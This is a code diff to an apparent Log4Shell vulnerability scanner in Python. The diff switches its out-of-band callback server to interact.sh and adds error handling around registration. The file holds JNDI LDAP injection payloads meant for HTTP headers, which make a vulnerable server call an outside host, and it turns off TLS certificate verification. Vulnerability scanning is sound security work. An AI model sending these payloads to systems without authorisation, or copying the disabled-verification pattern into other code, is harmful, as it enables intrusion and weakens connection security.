@@ -19,14 +19,13 @@ from Crypto.Hash import SHA256
 # Disable insecure SSL warning
 try:
     import requests.packages.urllib3
-
     requests.packages.urllib3.disable_warnings()
 except Exception:
     pass
 
 TESTING_PAYLOAD = "${jndi:ldap://HOST/ID}"
 INTERACTSH_PAYLOAD = "${jndi:ldap://HOST}"
-INTERACTSH_SERVER = "interactsh.com"
+INTERACTSH_SERVER = "interact.sh"
 HEADERS = [
     "User-Agent",
     "X-Api-Version",
@@ -66,10 +65,14 @@ class Interactsh:
             "secret-key": self.secret,
             "correlation-id": self.correlation_id
         }
-        res = self.session.post(
-            f"https://{self.server}/register", headers=self.headers, json=data, verify=False)
-        if 'success' not in res.text:
-            cprint(f"[!] {res.text}", color="red")
+        try:
+            res = self.session.post(
+                f"https://{self.server}/register", headers=self.headers, json=data, verify=False)
+            if 'success' not in res.text:
+                cprint(f"[!] {res.text}", color="red")
+        except Exception as e:
+            cprint(f"[!] interact.sh registration failed with exception: {str(e)}", color="red", flush=True)
+            raise e
 
     def poll(self):
         count = 3
